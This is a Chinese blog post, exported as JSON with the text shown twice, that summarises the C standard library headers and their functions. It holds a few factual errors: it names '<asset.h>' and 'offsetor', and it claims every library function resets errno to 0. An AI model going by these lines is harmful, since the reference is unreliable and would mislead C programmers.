atan2(y, x)         | 求出 *tan-1(y/x)*，其值的范围是[-*pai,pai]*                  |\n| ldexp(x, int n)     | 求出*x\\*2n*                                                  |\n| frexp(x, int *exp)  | 把 *x*分解为 *y\\*2n*， 是位于区间 *[1/2,1)*里的一个小数，作为函数结果返回，整数*n* 通过指针*exp返回（应提供一个int变量地址）。当*x* 为*0*时这两个结果的值都是*0* |\n| modf(x, double *ip) | 把**x**分解为小数部分和整数部分，小数部分作为函数返回值，整数部分通过指针*ip返回。 |\n\n### **五、字符处理函数（\\*<ctype.h>\\*）**\n\n见下表：\n\n \n\n| int isalpha(c)     | c是字母字符                                    |\n| ------------------ | ---------------------------------------------- |\n| int isdigit(c)     | c是数字字符                                    |\n| int isalnum(c)     | c是字母或数字字符                              |\n| int isspace(c)     | c是空格、制表符、换行符                        |\n| int isupper(c)     | c是大写字母                                    |\n| int islower(c)     | c是小写字母                                    |\n| int iscntrl(c)     | c是控制字符                                    |\n| int isprint(c)     | c是可打印字符，包括空格                        |\n| int isgraph(c)     | c是可打印字符，不包括空格                      |\n| int isxdigit(c)    | c是十六进制数字字符                            |\n| int ispunct(c)     | c是标点符号                                    |\n| int tolower(int c) | 当c是大写字母时返回对应小写字母，否则返回c本身 |\n| int toupper(int c) | 当c是小写字母时返回对应大写字母，否则返回c本身 |\n\n注：条件成立时这些函数返回非*0*值。最后两个转换函数对于非字母参数返回原字符。\n\n## **六、字符串函数（\\*<string.h>\\*）**\n\n### **字符串函数**\n\n   所有字符串函数列在下表里，函数描述采用如下约定：s、t表示 (char *)类型的参数，cs、ct表示(const  char*)类型的参数（它们都应表示字符串）。n表示size_t类型的参数（size_t是一个无符号的整数类型），c是整型参数（在函数里转换到char）：\n\n \n\n| 函数原型              | 意义解释                                                     |\n| --------------------- | ------------------------------------------------------------ |\n| size_t strlen(cs)     | 求出cs的长度                                                 |\n| char *strcpy(s,ct)    | 把ct复制到s。要求s指定足够大的字符数组                       |\n| char *strncpy(s,ct,n) | 把ct里的至多n个字符复制到s。要求s指定一个足够大的字符数组。如果ct里的字符不够n个，就在s里填充空字符。 |\n| char *strcat(s,ct)    | 把ct里的字符复制到s里已有的字符串之后。s应指定一个保存着字符串，而且足够大的字符数组。 |\n| char *strncat(s,ct,n) | 把ct里的至多n个字符复制到s里已有的字符串之后。s应指定一个保存着字符串，而且足够大的字符数组。 |\n| int strcmp(cs,ct)     | 比较字符串cs和ct的大小，在cs大于、等于、小于ct时分别返回正值、0、负值。 |\n| int strncmp(cs,ct,n)  | 比较字符串cs和ct的大小，至多比较n个字符。在cs大于、等于、小于ct时分别返回正值、0、负值。 |\n| char *strchr(cs,c)    | 在cs中查寻c并返回c第一个出现的位置，用指向这个位置的指针表示。当cs里没有c时返回值NULL |\n| char *strrchr(cs,c)   | 在cs中查寻c并返回c最后一个出现的位置，没有时返回NULL         |\n| size_t strspn(cs,ct)  | 由cs起确定一段全由ct里的字符组成的序列，返回其长度           |\n| size_t strcspn(cs,ct) | 由cs起确定一段全由非ct里的字符组成的序列，返回其长度         |\n| char *strpbrk(cs,ct)  | 在cs里查寻ct里的字符，返回第一个满足条件的字符出现的位置，没有时返回NULL |\n| char *strstr(cs,ct)   | 在cs中查寻串ct（查询子串），返回ct作为cs的子串的第一个出现的位置，ct未出现在cs里时返回NULL |\n| char *strerror(n)     | 返回与错误编号n相关的错误信息串（指向该错误信息串的指针）    |\n| char *strtok(s,ct)    | 在s中查寻由ct中的字符作为分隔符而形成的单词                  |\n\n### **存储区操作**\n\n​    <string.h>还有一组字符数组操作函数（存储区操作函数），名字都以mem开头，以某种高效方式实现。在下面原型中，参数s和t的类型是(void *)，cs和ct的类型是(const void *)，n的类型是size_t，c的类型是int（转换为unsigned char）。\n\n \n\n| 函数原型              | 意义解释                                                     |\n| --------------------- | ------------------------------------------------------------ |\n| void *memcpy(s,ct,n)  | 从ct处复制n个字符到s处，返回s                                |\n| void *memmove(s,ct,n) | 从ct处复制n个字符到s处，返回s，这里的两个段允许重叠          |\n| int memcmp(cs,ct,n)   | 比较由cs和ct开始的n个字符，返回值定义同strcmp                |\n| void *memchr(cs,c,n)  | 在n个字符的范围内查寻c在cs中的第一次出现，如果找到，返回该位置的指针值，否则返回NULL |\n| void *memset(s,c,n)   | 将s的前n个字符设置为c，返回s                                 |\n\n## **七、功能函数（<stdlib.h>）**\n\n随机数函数：\n\n \n\n| 函数原型                  | 意义解释                           |\n| ------------------------- | ---------------------------------- |\n| int rand(void)            | 生成一个0到RAND_MAX的随机整数      |\n| void srand(unsigned seed) | 用seed为随后的随机数生成设置种子值 |\n\n动态存储分配函数：\n\n \n\n| 函数原型                            | 意义解释                                                     |\n| ----------------------------------- | ------------------------------------------------------------ |\n| void *calloc(size_t n, size_t size) | 分配一块存储，其中足以存放n个大小为size的对象，并将所有字节用0字符填充。返回该存储块的地址。不能满足时返回NULL |\n| void *malloc(size_t size)           | 分配一块足以存放大小为size的存储，返回该存储块的地址，不能满足时返回NULL |\n| void *realloc(void *p, size_t size) | 将p所指存储块调整为大小size，返回新块的地址。如能满足要求，新块的内容与原块一致；不能满足要求时返回NULL，此时原块不变 |\n| void free(void *p)                  | 释放以前分配的动态存储块                                     |\n\n### **几个整数函数**\n\n  几个简单的整数函数见下表，div_t和ldiv_t是两个预定义结构类型，用于存放整除时得到的商和余数。div_t类型的成分是int类型的quot和rem，ldiv_t类型的成分是long类型的quot和rem。\n\n \n\n| 函数原型                    | 意义解释                                      |\n| --------------------------- | --------------------------------------------- |\n| int abs(int n)              | 求整数的绝对值                                |\n| long labs(long n)           | 求长整数的绝对值                              |\n| div_t div(int n, int m)     | 求n/m，商和余数分别存放到结果结构的对应成员里 |\n| ldiv_t ldiv(long n, long m) | 同上，参数为长整数                            |\n\n### **数值转换**\n\n \n\n| 函数原型                   | 意义解释              |\n| -------------------------- | --------------------- |\n| double atof(const char *s) | 由串s构造一个双精度值 |\n| int atoi(const char *s)    | 由串s构造一个整数值   |\n| long atol(const char *s)   | 由串s构造一个长整数值 |\n\n### **执行控制**\n\n*1*）非正常终止函数abort。\n\n​     原型是： *void abort(void);*\n\n*2*）正常终止函数exit。\n\n​     原型是：*void exit(int status);*\n\n  导致程序按正常方式立即终止。status作为送给执行环境的出口值，*0*表示成功结束，两个可用的常数为EXIT_SUCCESS，EXIT_FAILURE。\n\n*3*）正常终止注册函数atexit。\n\n​     原型是：*int atexit(void (\\*fcn)(void))*\n\n  可用本函数把一些函数注册为结束动作。被注册函数应当是无参无返回值的函数。注册正常完成时atexit返回值*0*，否则返回非零值。\n\n**与执行环境交互**\n\n*1*）向执行环境传送命令的函数system。\n\n​      原型是：*int system(const char \\*s);*\n\n  把串s传递给程序的执行环境要求作为系统命令执行。如以NULL为参数调用，函数返回非*0*表示环境里有命令解释器。如果s不是NULL，返回值由实现确定。\n\n*2*）访问执行环境的函数getenv。\n\n​      原型是：*char \\*getenv(const char \\*s);*\n\n  从执行环境中取回与字符串s相关联的环境串。如果找不到就返回NULL。本函数的具体结果由实现确定。在许多执行环境里，可以用这个函数去查看“环境变量”的值。\n\n### **常用函数bsearch和qsort**\n\n*1*）二分法查找函数bsearch：\n\n  *void \\*bsearch(const void \\*key, const void \\*base,* *size_t n, size_t size,* *int (\\*cmp)(const void \\*keyval, const void \\*datum));*\n\n  函数指针参数cmp的实参应是一个与字符串比较函数strcmp类似的函数，确定排序的顺序，当第一个参数keyval比第二个参数datum大、相等或小时分别返回正、零或负值。\n\n*2*）快速排序函数qsort：\n\n   *void qsort(void \\*base, size_t n, size_t size,* *int (\\*cmp)(const void \\*, const void \\*));*\n\n  qsort对于比较函数cmp的要求与bsearch一样。设有数组base[0],...,base[n-1]，元素大小为size。用qsort可以把这个数组的元素按cmp确定的上升顺序重新排列。","source":"_posts/c-常用库函数.md","raw":"标准头文件包括：\n\n*<asset.h>   <ctype.h>    <errno.h>    <float.h>* \n\n*<limits.h>    <locale.h>    <math.h>    <setjmp.h>* \n\n*<signal.h>   <stdarg.h>   <stddef.h>   <stdlib.h>*\n\n*<stdio.h>   <string.h>    <time.h>*\n\n****\\*一、标准定义（\\**\\**\\*<stddef.h>\\*\\**\\**）\\***** \n\n  文件<stddef.h>里包含了标准库的一些常用定义，无论我们包含哪个标准头文件，<stddef.h>都会被自动包含进来。\n\n  这个文件里定义：\n\n l  类型size_t  （sizeof运算符的结果类型，是某个无符号整型）；\n\n l  类型ptrdiff_t（两个指针相减运算的结果类型，是某个有符号整型）；\n\n l  类型wchar_t （宽字符类型，是一个整型，其中足以存放本系统所支持的所有本地环境中的字符集的所有编码值。这里还保证空字符的编码值为0）；\n\n  l  符号常量NULL （空指针值）；\n\n l  宏offsetor  （这是一个带参数的宏，第一个参数应是一个结构类型，第二个参数应是结构成员名。\n\n​          offsetor(s,m)求出成员m在结构类型t的变量里的偏移量）。\n\n  注：其中有些定义也出现在其他头文件里（如NULL）。\n\n### **二、错误信息（\\*<errno.h>\\*）**\n\n   <errno.h>定义了一个*int*类型的表达式*errno*，可以看作一个变量，其初始值为*0*，一些标准库函数执行中出错时将它设为非*0*值，但任何标准库函数都设置它为*0*。\n\n   *<errno.h>*里还定义了两个宏*EDOM*和*ERANGE*，都是非*0*的整数值。数学函数执行中遇到参数错误，就会将*errno*置为*EDOM*，如出现值域错误就会将*errno*置为*ERANGE*。\n\n### **三、输入输出函数（\\*<stdio.h>\\*）**\n\n***\\**\\*文件打开和关闭：\\*\\**\\***\n\n   *FILE \\*fopen(const char \\*filename, const char \\*mode);*\n\n   *int fclose(FILE \\* stream);*\n\n***\\**\\*字符输入输出：\\*\\**\\***\n\n   *int fgetc(FILE \\*fp);*\n\n   *int fputc(int c, FILE \\*fp);*\n\n  getc和putc与这两个函数类似，但通过宏定义实现。通常有下面定义：\n\n   *#define getchar() getc(stdin)*\n\n   *#define putchar(c) putc(c, stdout)*\n\n   *int ungetc(int c, FILE\\* stream);//把字符 c 退回流 stream*\n\n***\\**\\*格式化输入输出：\\*\\**\\***\n\n   *int scanf(const char \\*format, ...);*\n\n   *int printf(const char \\*format, ...);*\n\n   *int fscanf(FILE \\*stream, const char \\*format, ...);*\n\n   *int fprintf(FILE \\*stream, const char \\*format, ...);*\n\n   *int sscanf(char \\*s, const char \\*format, ...);*\n\n   *int sprintf(char \\*s, const char \\*format, ...);*\n\n***\\**\\*行式输入输出：\\*\\**\\***\n\n   *char \\*fgets(char \\*buffer, int n, FILE \\*stream);*\n\n   *int fputs(const char \\*buffer, FILE \\*stream);*\n\n   *char \\*gets(char \\*s);*\n\n   *int puts(const char \\*s);*\n\n***\\**\\*直接输入输出：\\*\\**\\***\n\n   *size_t fread(void \\*pointer, size_t size,* *size_t num, FILE \\*stream);*\n\n   *size_t fwrite(const void \\*pointer, size_t size,* *size_t num, FILE \\*stream);*\n\n \n\n***\\**\\*四、数学函数（\\*\\*\\*\\*\\*<math.h>\\*\\*\\*\\*\\*）\\*\\**\\***\n\n三角函数：\n\n \n\n| 三角函数   | sin  | cos  | tan  |\n| ---------- | ---- | ---- | ---- |\n| 反三角函数 | asin | acos | atan |\n| 双曲函数   | sinh | cosh | tanh |\n\n指数和对数函数：\n\n \n\n| 以*e*为底的指数函数  | exp   |\n| -------------------- | ----- |\n| 自然对数函数         | log   |\n| 以*10*为底的对数函数 | log10 |\n\n其他函数：\n\n \n\n| 平方根                                 | sqrt                        |\n| -------------------------------------- | --------------------------- |\n| 绝对值                                 | fabs                        |\n| 乘幂，第一个参数作为底，第二个是指数   | double pow(double, double)  |\n| 实数的余数，两个参数分别是被除数和除数 | double fmod(double, double) |\n\n注：所有上面未给出类型特征的函数都取一个参数，其参数与返回值都是double类型。\n\n下面函数返回双精度值（包括函数ceil和floor）。在下表里，除其中有特别说明的参数之外，所有函数的其他参数都是double类型。\n\n \n\n| 函数原型            | 意义解释                                                     |\n| ------------------- | ------------------------------------------------------------ |\n| ceil(x)             | 求出不小于**x**的最小整数（返回与这个整数对应的double值）    |\n| floor(x)            | 求出不大于**x**的最大整数（返回与这个整数对应的double值）    |\n| atan2(y, x)         | 求出 *tan-1(y/x)*，其值的范围是[-*pai,pai]*                  |\n| ldexp(x, int n)     | 求出*x\\*2n*                                                  |\n| frexp(x, int *exp)  | 把 *x*分解为 *y\\*2n*， 是位于区间 *[1/2,1)*里的一个小数，作为函数结果返回，整数*n* 通过指针*exp返回（应提供一个int变量地址）。当*x* 为*0*时这两个结果的值都是*0* |\n| modf(x, double *ip) | 把**x**分解为小数部分和整数部分，小数部分作为函数返回值，整数部分通过指针*ip返回。 |\n\n### **五、字符处理函数（\\*<ctype.h>\\*）**\n\n见下表：\n\n \n\n| int isalpha(c)     | c是字母字符                                    |\n| ------------------ | ---------------------------------------------- |\n| int isdigit(c)     | c是数字字符                                    |\n| int isalnum(c)     | c是字母或数字字符                              |\n| int isspace(c)     | c是空格、制表符、换行符                        |\n| int isupper(c)     | c是大写字母                                    |\n| int islower(c)     | c是小写字母                                    |\n| int iscntrl(c)     | c是控制字符                                    |\n| int isprint(c)     | c是可打印字符，包括空格                        |\n| int isgraph(c)     | c是可打印字符，不包括空格                      |\n| int isxdigit(c)    | c是十六进制数字字符                            |\n| int ispunct(c)     | c是标点符号                                    |\n| int tolower(int c) | 当c是大写字母时返回对应小写字母，否则返回c本身 |\n| int toupper(int c) | 当c是小写字母时返回对应大写字母，否则返回c本身 |\n\n注：条件成立时这些函数返回非*0*值。最后两个转换函数对于非字母参数返回原字符。\n\n## **六、字符串函数（\\*<string.h>\\*）**\n\n### **字符串函数**\n\n   所有字符串函数列在下表里，函数描述采用如下约定：s、t表示 (char *)类型的参数，cs、ct表示(const  char*)类型的参数（它们都应表示字符串）。n表示size_t类型的参数（size_t是一个无符号的整数类型），c是整型参数（在函数里转换到char）：\n\n \n\n| 函数原型              | 意义解释                                                     |\n| --------------------- | ------------------------------------------------------------ |\n| size_t strlen(cs)     | 求出cs的长度                                                 |\n| char *strcpy(s,ct)    | 把ct复制到s。要求s指定足够大的字符数组                       |\n| char *strncpy(s,ct,n) | 把ct里的至多n个字符复制到s。要求s指定一个足够大的字符数组。如果ct里的字符不够n个，就在s里填充空字符。 |\n| char *strcat(s,ct)    | 把ct里的字符复制到s里已有的字符串之后。s应指定一个保存着字符串，而且足够大的字符数组。 |\n| char *strncat(s,ct,n) | 把ct里的至多n个字符复制到s里已有的字符串之后。s应指定一个保存着字符串，而且足够大的字符数组。 |\n| int strcmp(cs,ct)     | 比较字符串cs和ct的大小，在cs大于、等于、小于ct时分别返回正值、0、负值。 |\n| int strncmp(cs,ct,n)  | 比较字符串cs和ct的大小，至多比较n个字符。在cs大于、等于、小于ct时分别返回正值、0、负值。 |\n| char *strchr(cs,c)    | 在cs中查寻c并返回c第一个出现的位置，用指向这个位置的指针表示。当cs里没有c时返回值NULL |\n| char *strrchr(cs,c)   | 在cs中查寻c并返回c最后一个出现的位置，没有时返回NULL         |\n| size_t strspn(cs,ct)  | 由cs起确定一段全由ct里的字符组成的序列，返回其长度           |\n| size_t strcspn(cs,ct) | 由cs起确定一段全由非ct里的字符组成的序列，返回其长度         |\n| char *strpbrk(cs,ct)  | 在cs里查寻ct里的字符，返回第一个满足条件的字符出现的位置，没有时返回NULL |\n| char *strstr(cs,ct)   | 在cs中查寻串ct（查询子串），返回ct作为cs的子串的第一个出现的位置，ct未出现在cs里时返回NULL |\n| char *strerror(n)     | 返回与错误编号n相关的错误信息串（指向该错误信息串的指针）    |\n| char *strtok(s,ct)    | 在s中查寻由ct中的字符作为分隔符而形成的单词                  |\n\n### **存储区操作**\n\n​    <string.h>还有一组字符数组操作函数（存储区操作函数），名字都以mem开头，以某种高效方式实现。在下面原型中，参数s和t的类型是(void *)，cs和ct的类型是(const void *)，n的类型是size_t，c的类型是int（转换为unsigned char）。\n\n \n\n| 函数原型              | 意义解释                                                     |\n| --------------------- | ------------------------------------------------------------ |\n| void *memcpy(s,ct,n)  | 从ct处复制n个字符到s处，返回s                                |\n| void *memmove(s,ct,n) | 从ct处复制n个字符到s处，返回s，这里的两个段允许重叠          |\n| int memcmp(cs,ct,n)   | 比较由cs和ct开始的n个字符，返回值定义同strcmp                |\n| void *memchr(cs,c,n)  | 在n个字符的范围内查寻c在cs中的第一次出现，如果找到，返回该位置的指针值，否则返回NULL |\n| void *memset(s,c,n)   | 将s的前n个字符设置为c，返回s                                 |\n\n## **七、功能函数（<stdlib.h>）**\n\n随机数函数：\n\n \n\n| 函数原型                  | 意义解释                           |\n| ------------------------- | ---------------------------------- |\n| int rand(void)            | 生成一个0到RAND_MAX的随机整数      |\n| void srand(unsigned seed) | 用seed为随后的随机数生成设置种子值 |\n\n动态存储分配函数：\n\n \n\n| 函数原型                            | 意义解释                                                     |\n| ----------------------------------- | ------------------------------------------------------------ |\n| void *calloc(size_t n, size_t size) | 分配一块存储，其中足以存放n个大小为size的对象，并将所有字节用0字符填充。返回该存储块的地址。不能满足时返回NULL |\n| void *malloc(size_t size)           | 分配一块足以存放大小为size的存储，返回该存储块的地址，不能满足时返回NULL |\n| void *realloc(void *p, size_t size) | 将p所指存储块调整为大小size，返回新块的地址。如能满足要求，新块的内容与原块一致；不能满足要求时返回NULL，此时原块不变 |\n| void free(void *p)                  | 释放以前分配的动态存储块                                     |\n\n### **几个整数函数**\n\n  几个简单的整数函数见下表，div_t和ldiv_t是两个预定义结构类型，用于存放整除时得到的商和余数。div_t类型的成分是int类型的quot和rem，ldiv_t类型的成分是long类型的quot和rem。\n\n \n\n| 函数原型                    | 意义解释                                      |\n| --------------------------- | --------------------------------------------- |\n| int abs(int n)              | 求整数的绝对值                                |\n| long labs(long n)           | 求长整数的绝对值                              |\n| div_t div(int n, int m)     | 求n/m，商和余数分别存放到结果结构的对应成员里 |\n| ldiv_t ldiv(long n, long m) | 同上，参数为长整数                            |\n\n### **数值转换**\n\n \n\n| 函数原型                   | 意义解释              |\n| -------------------------- | --------------------- |\n| double atof(const char *s) | 由串s构造一个双精度值 |\n| int atoi(const char *s)    | 由串s构造一个整数值   |\n| long atol(const char *s)   | 由串s构造一个长整数值 |\n\n### **执行控制**\n\n*1*）非正常终止函数abort。\n\n​     原型是： *void abort(void);*\n\n*2*）正常终止函数exit。\n\n​     原型是：*void exit(int status);*\n\n  导致程序按正常方式立即终止。status作为送给执行环境的出口值，*0*表示成功结束，两个可用的常数为EXIT_SUCCESS，EXIT_FAILURE。\n\n*3*）正常终止注册函数atexit。\n\n​     原型是：*int atexit(void (\\*fcn)(void))*\n\n  可用本函数把一些函数注册为结束动作。被注册函数应当是无参无返回值的函数。注册正常完成时atexit返回值*0*，否则返回非零值。\n\n**与执行环境交互**\n\n*1*）向执行环境传送命令的函数system。\n\n​      原型是：*int system(const char \\*s);*\n\n  把串s传递给程序的执行环境要求作为系统命令执行。如以NULL为参数调用，函数返回非*0*表示环境里有命令解释器。如果s不是NULL，返回值由实现确定。\n\n*2*）访问执行环境的函数getenv。\n\n​      原型是：*char \\*getenv(const char \\*s);*\n\n  从执行环境中取回与字符串s相关联的环境串。如果找不到就返回NULL。本函数的具体结果由实现确定。在许多执行环境里，可以用这个函数去查看“环境变量”的值。\n\n### **常用函数bsearch和qsort**\n\n*1*）二分法查找函数bsearch：\n\n  *void \\*bsearch(const void \\*key, const void \\*base,* *size_t n, size_t size,* *int (\\*cmp)(const void \\*keyval, const void \\*datum));*\n\n  函数指针参数cmp的实参应是一个与字符串比较函数strcmp类似的函数，确定排序的顺序，当第一个参数keyval比第二个参数datum大、相等或小时分别返回正、零或负值。\n\n*2*）快速排序函数qsort：\n\n   *void qsort(void \\*base, size_t n, size_t size,* *int (\\*cmp)(const void \\*, const void \\*));*\n\n  qsort对于比较函数cmp的要求与bsearch一样。设有数组base[0],...,base[n-1]，元素大小为size。用qsort可以把这个数组的元素按cmp确定的上升顺序重新排列。","slug":"c-常用库函数","published":1,"date":"2021-06-28T17:16:37.274Z","updated":"2021-06-28T17:17:34.949Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n970001rouvgjrdb5dm","content":"<p>标准头文件包括：</p>\n<p><em>&lt;asset.h&gt;   &lt;ctype.h&gt;    &lt;errno.h&gt;    &lt;float.h&gt;</em> </p>\n<p><em>&lt;limits.h&gt;    &lt;locale.h&gt;    &lt;math.h&gt;    &lt;setjmp.h&gt;</em> </p>\n<p><em>&lt;signal.h&gt;   &lt;stdarg.h&gt;   &lt;stddef.h&gt;   &lt;stdlib.h&gt;</em></p>\n<p><em>&lt;stdio.h&gt;   &lt;string.h&gt;    &lt;time.h&gt;</em></p>\n<p><strong>*<em>*一、标准定义（*</em>*<em>*&lt;stddef.h&gt;**</em>**）*</strong>** </p>\n<p>  文件&lt;stddef.h&gt;里包含了标准库的一些常用定义，无论我们包含哪个标准头文件，&lt;stddef.h&gt;都会被自动包含进来。</p>\n<p>  这个文件里定义：</p>\n<p> l  类型size_t  （sizeof运算符的结果类型，是某个无符号整型）；</p>\n<p> l  类型ptrdiff_t（两个指针相减运算的结果类型，是某个有符号整型）；</p>\n<p> l  类型wchar_t （宽字符类型，是一个整型，其中足以存放本系统所支持的所有本地环境中的字符集的所有编码值。这里还保证空字符的编码值为0）；</p>\n<p>  l  符号常量NULL （空指针值）；</p>\n<p> l  宏offsetor  （这是一个带参数的宏，第一个参数应是一个结构类型，第二个参数应是结构成员名。</p>\n<p>​          offsetor(s,m)求出成员m在结构类型t的变量里的偏移量）。</p>\n<p>  注：其中有些定义也出现在其他头文件里（如NULL）。</p>\n<h3 id=\"二、错误信息（-lt-errno-h-gt-）\"><a href=\"#二、错误信息（-lt-errno-h-gt-）\" class=\"headerlink\" title=\"二、错误信息（*&lt;errno.h&gt;*）\"></a><strong>二、错误信息（*&lt;errno.h&gt;*）</strong></h3><p>   &lt;errno.h&gt;定义了一个<em>int</em>类型的表达式<em>errno</em>，可以看作一个变量，其初始值为<em>0</em>，一些标准库函数执行中出错时将它设为非<em>0</em>值，但任何标准库函数都设置它为<em>0</em>。</p>\n<p>   <em>&lt;errno.h&gt;<em>里还定义了两个宏</em>EDOM</em>和<em>ERANGE</em>，都是非<em>0</em>的整数值。数学函数执行中遇到参数错误，就会将<em>errno</em>置为<em>EDOM</em>，如出现值域错误就会将<em>errno</em>置为<em>ERANGE</em>。</p>\n<h3 id=\"三、输入输出函数（-lt-stdio-h-gt-）\"><a href=\"#三、输入输出函数（-lt-stdio-h-gt-）\" class=\"headerlink\" title=\"三、输入输出函数（*&lt;stdio.h&gt;*）\"></a><strong>三、输入输出函数（*&lt;stdio.h&gt;*）</strong></h3><p><em>*<em>*</em>*文件打开和关闭：****</em>*</p>\n<p>   <em>FILE *fopen(const char *filename, const char *mode);</em></p>\n<p>   <em>int fclose(FILE * stream);</em></p>\n<p><em>*<em>*</em>*字符输入输出：****</em>*</p>\n<p>   <em>int fgetc(FILE *fp);</em></p>\n<p>   <em>int fputc(int c, FILE *fp);</em></p>\n<p>  getc和putc与这两个函数类似，但通过宏定义实现。通常有下面定义：</p>\n<p>   <em>#define getchar() getc(stdin)</em></p>\n<p>   <em>#define putchar(c) putc(c, stdout)</em></p>\n<p>   <em>int ungetc(int c, FILE* stream);//把字符 c 退回流 stream</em></p>\n<p><em>*<em>*</em>*格式化输入输出：****</em>*</p>\n<p>   <em>int scanf(const char *format, …);</em></p>\n<p>   <em>int printf(const char *format, …);</em></p>\n<p>   <em>int fscanf(FILE *stream, const char *format, …);</em></p>\n<p>   <em>int fprintf(FILE *stream, const char *format, …);</em></p>\n<p>   <em>int sscanf(char *s, const char *format, …);</em></p>\n<p>   <em>int sprintf(char *s, const char *format, …);</em></p>\n<p><em>*<em>*</em>*行式输入输出：****</em>*</p>\n<p>   <em>char *fgets(char *buffer, int n, FILE *stream);</em></p>\n<p>   <em>int fputs(const char *buffer, FILE *stream);</em></p>\n<p>   <em>char *gets(char *s);</em></p>\n<p>   <em>int puts(const char *s);</em></p>\n<p><em>*<em>*</em>*直接输入输出：****</em>*</p>\n<p>   <em>size_t fread(void *pointer, size_t size,</em> <em>size_t num, FILE *stream);</em></p>\n<p>   <em>size_t fwrite(const void *pointer, size_t size,</em> <em>size_t num, FILE *stream);</em></p>\n<p><em>*<em>*</em>*四、数学函数（*****&lt;math.h&gt;*****）****</em>*</p>\n<p>三角函数：</p>\n<table>\n<thead>\n<tr>\n<th>三角函数</th>\n<th>sin</th>\n<th>cos</th>\n<th>tan</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>反三角函数</td>\n<td>asin</td>\n<td>acos</td>\n<td>atan</td>\n</tr>\n<tr>\n<td>双曲函数</td>\n<td>sinh</td>\n<td>cosh</td>\n<td>tanh</td>\n</tr>\n</tbody></table>\n<p>指数和对数函数：</p>\n<table>\n<thead>\n<tr>\n<th>以<em>e</em>为底的指数函数</th>\n<th>exp</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>自然对数函数</td>\n<td>log</td>\n</tr>\n<tr>\n<td>以<em>10</em>为底的对数函数</td>\n<td>log10</td>\n</tr>\n</tbody></table>\n<p>其他函数：</p>\n<table>\n<thead>\n<tr>\n<th>平方根</th>\n<th>sqrt</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>绝对值</td>\n<td>fabs</td>\n</tr>\n<tr>\n<td>乘幂，第一个参数作为底，第二个是指数</td>\n<td>double pow(double, double)</td>\n</tr>\n<tr>\n<td>实数的余数，两个参数分别是被除数和除数</td>\n<td>double fmod(double, double)</td>\n</tr>\n</tbody></table>\n<p>注：所有上面未给出类型特征的函数都取一个参数，其参数与返回值都是double类型。</p>\n<p>下面函数返回双精度值（包括函数ceil和floor）。在下表里，除其中有特别说明的参数之外，所有函数的其他参数都是double类型。</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ceil(x)</td>\n<td>求出不小于<strong>x</strong>的最小整数（返回与这个整数对应的double值）</td>\n</tr>\n<tr>\n<td>floor(x)</td>\n<td>求出不大于<strong>x</strong>的最大整数（返回与这个整数对应的double值）</td>\n</tr>\n<tr>\n<td>atan2(y, x)</td>\n<td>求出 *tan-1(y/x)*，其值的范围是[-<em>pai,pai]</em></td>\n</tr>\n<tr>\n<td>ldexp(x, int n)</td>\n<td>求出<em>x*2n</em></td>\n</tr>\n<tr>\n<td>frexp(x, int *exp)</td>\n<td>把 <em>x</em>分解为 <em>y*2n</em>， 是位于区间 <em>[1/2,1)<em>里的一个小数，作为函数结果返回，整数</em>n</em> 通过指针<em>exp返回（应提供一个int变量地址）。当</em>x* 为<em>0</em>时这两个结果的值都是<em>0</em></td>\n</tr>\n<tr>\n<td>modf(x, double *ip)</td>\n<td>把<strong>x</strong>分解为小数部分和整数部分，小数部分作为函数返回值，整数部分通过指针*ip返回。</td>\n</tr>\n</tbody></table>\n<h3 id=\"五、字符处理函数（-lt-ctype-h-gt-）\"><a href=\"#五、字符处理函数（-lt-ctype-h-gt-）\" class=\"headerlink\" title=\"五、字符处理函数（*&lt;ctype.h&gt;*）\"></a><strong>五、字符处理函数（*&lt;ctype.h&gt;*）</strong></h3><p>见下表：</p>\n<table>\n<thead>\n<tr>\n<th>int isalpha(c)</th>\n<th>c是字母字符</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>int isdigit(c)</td>\n<td>c是数字字符</td>\n</tr>\n<tr>\n<td>int isalnum(c)</td>\n<td>c是字母或数字字符</td>\n</tr>\n<tr>\n<td>int isspace(c)</td>\n<td>c是空格、制表符、换行符</td>\n</tr>\n<tr>\n<td>int isupper(c)</td>\n<td>c是大写字母</td>\n</tr>\n<tr>\n<td>int islower(c)</td>\n<td>c是小写字母</td>\n</tr>\n<tr>\n<td>int iscntrl(c)</td>\n<td>c是控制字符</td>\n</tr>\n<tr>\n<td>int isprint(c)</td>\n<td>c是可打印字符，包括空格</td>\n</tr>\n<tr>\n<td>int isgraph(c)</td>\n<td>c是可打印字符，不包括空格</td>\n</tr>\n<tr>\n<td>int isxdigit(c)</td>\n<td>c是十六进制数字字符</td>\n</tr>\n<tr>\n<td>int ispunct(c)</td>\n<td>c是标点符号</td>\n</tr>\n<tr>\n<td>int tolower(int c)</td>\n<td>当c是大写字母时返回对应小写字母，否则返回c本身</td>\n</tr>\n<tr>\n<td>int toupper(int c)</td>\n<td>当c是小写字母时返回对应大写字母，否则返回c本身</td>\n</tr>\n</tbody></table>\n<p>注：条件成立时这些函数返回非<em>0</em>值。最后两个转换函数对于非字母参数返回原字符。</p>\n<h2 id=\"六、字符串函数（-lt-string-h-gt-）\"><a href=\"#六、字符串函数（-lt-string-h-gt-）\" class=\"headerlink\" title=\"六、字符串函数（*&lt;string.h&gt;*）\"></a><strong>六、字符串函数（*&lt;string.h&gt;*）</strong></h2><h3 id=\"字符串函数\"><a href=\"#字符串函数\" class=\"headerlink\" title=\"字符串函数\"></a><strong>字符串函数</strong></h3><p>   所有字符串函数列在下表里，函数描述采用如下约定：s、t表示 (char <em>)类型的参数，cs、ct表示(const  char</em>)类型的参数（它们都应表示字符串）。n表示size_t类型的参数（size_t是一个无符号的整数类型），c是整型参数（在函数里转换到char）：</p>\n<table>\n<thead>\n<tr>\n<th>函数原型</th>\n<th>意义解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>size_t strlen(cs)</td>\n<td>求出cs的长度</td>\n</tr>\n<tr>\n<td>char *strcpy(s,ct)</td>\n<td>把ct复制到s。要求s指定足够大的字符数组</td>\n</tr>\n<tr>\n<td>char *strncpy(s,ct,n)</td>\n<td>把ct里的至多n个字符复制到s。要求s指定一个足够大的字符数组。如果ct里的字符不够n个，就在s里填充空字符。</td>\n</tr>\n<tr>\n<td>char 